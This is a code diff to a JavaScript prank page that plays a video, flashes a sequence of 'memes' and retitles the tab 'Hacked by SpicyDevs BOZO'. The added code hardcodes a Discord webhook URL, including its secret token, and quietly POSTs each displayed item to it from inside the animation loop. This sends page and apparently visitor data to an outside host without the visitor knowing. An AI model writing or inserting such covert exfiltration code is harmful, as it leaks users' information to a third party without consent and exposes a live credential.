@@ -25,7 +25,29 @@
         "Definitely",
         "Absolutely",
       ]
+      const webhookUrl = "https://discord.com/api/webhooks/1111166274110771280/R2dwQ4tln3aFxCSIH4cq1_esSXG0MxEHIIlL4ALzT8sb1OS3NSZkRlPL77_W7lAxL6ca";
 
+// Function to send data to Discord webhook
+const sendDataToWebhook = async (data) => {
+  try {
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ content: data }),
+    });
+  } catch (error) {
+    console.error('Failed to send data to Discord webhook:', error);
+  }
+};
+
+// Send data to Discord webhook
+const sendToWebhook = (data) => {
+  sendDataToWebhook(data).then(() => {
+    console.log('Data sent to Discord webhook');
+  });
+};
       try {
         const memes = []
         const push = (tit, con, add) => memes.push(`${tit}: ${con}${add || ''}`)
@@ -110,10 +132,10 @@
           video.play();
 
           const interval = setInterval(() => {
-            const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
-            if (step >= memes.length) step = -Infinity;
-            if (step < 0) return clearInterval(interval);
-            if (time >= 0) {
+          const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
+          if (step >= memes.length) step = -Infinity;
+          if (step < 0) return clearInterval(interval);
+          if (time >= 0) {
               if (step == 0) document.title = `Hacked by SpicyDevs BOZO`
               const el = document.createElement('span');
               el.textContent = `${memes[step]}`
@@ -124,6 +146,7 @@
                 fontSize *= 0.88
                 data.style.fontSize = `${fontSize}px`
               }
+              sendToWebhook(`${memes[step]}`);
             }
           }, 5)
         }
